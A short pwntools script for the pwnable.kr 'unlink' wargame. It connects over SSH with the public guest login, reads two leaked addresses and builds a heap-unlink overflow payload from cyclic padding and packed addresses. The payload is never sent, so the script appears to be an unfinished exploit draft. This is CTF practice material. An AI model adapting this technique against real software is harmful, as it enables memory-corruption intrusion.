from pwn import * 



def getnum(byte):
    return int(re.findall(r"0x[0-9A-Fa-f]+",byte.decode())[0],16)



s = ssh(user="unlink",host="pwnable.kr",password="guest",port=2222)
sh = s.shell(b"/bin/bash")

print(sh.recv().decode())
sh.sendline(b"./unlink")

A_VAL = getnum(sh.recvline()) 
A_ADD = getnum(sh.recvline()) 

print(A_ADD,A_VAL)
print(sh.recv().decode())



payload = cyclic(24) + p32(A_ADD) + p32(A_VAL) 
sh.interactive()


